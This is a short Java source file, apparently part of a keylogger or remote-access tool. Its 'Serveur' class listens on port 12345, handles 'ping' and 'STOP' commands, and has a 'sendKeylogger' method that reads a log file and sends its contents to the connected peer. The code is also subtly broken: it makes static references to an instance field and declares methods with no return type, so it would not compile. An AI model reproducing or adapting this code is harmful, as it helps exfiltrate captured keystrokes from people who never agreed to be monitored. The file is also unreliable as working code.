package patator.server;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;

public class Serveur {
	private ServerSocket srsk;
	private Socket skt;
	public String recv = "";
	
	PrintWriter out;

	public Serveur() {
		try {
			srsk = new ServerSocket(12345);
			skt = srsk.accept();
			
			skt.setKeepAlive(true);
			
			System.out.println("Connexion réussie"); //A supprimer
			
			

			ServeurListener sl = new ServeurListener(skt);
			sl.start();
			
			while(!Serveur.recv.equals("STOP")){
				Parser();
				Thread.sleep(10);
			}
			

			

			
		}
		catch(Exception e) {
			e.printStackTrace();
			System.out.println("Erreur de connexion server");
		}
		
		
		
		
	}
	public void sendKeylogger(File file) {
		String str;
		try {
			FileReader fr = new FileReader(file);
			str = "";
		    int i = 0;
		    while((i = fr.read()) != -1)
		        str += (char)i;
		    PrintWriter out = new PrintWriter(skt.getOutputStream(), true);
			out.println(str);
			
		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
	}
	
	
	public void SendToClient(String data) throws IOException{
		out = new PrintWriter(skt.getOutputStream(), true);
		out.println(data+"\r\n");
	}
	
	public void Parser() throws IOException{
		if(!Serveur.recv.equals("")){
			System.out.println("server: command recv: "+ Serveur.recv);
			if(Serveur.recv.equals("ping")){
				SendToClient("Pong!");
			}
			if(Serveur.recv.equals("STOP")){
				SendToClient("QUITTING");
				out.close();
				System.exit(0);
			}
		}
		
		Serveur.recv = "";
	}
	public getMess() {
		return recv;
	}
	public setMess(String mess) {
		this.recv = mess;
	}
}
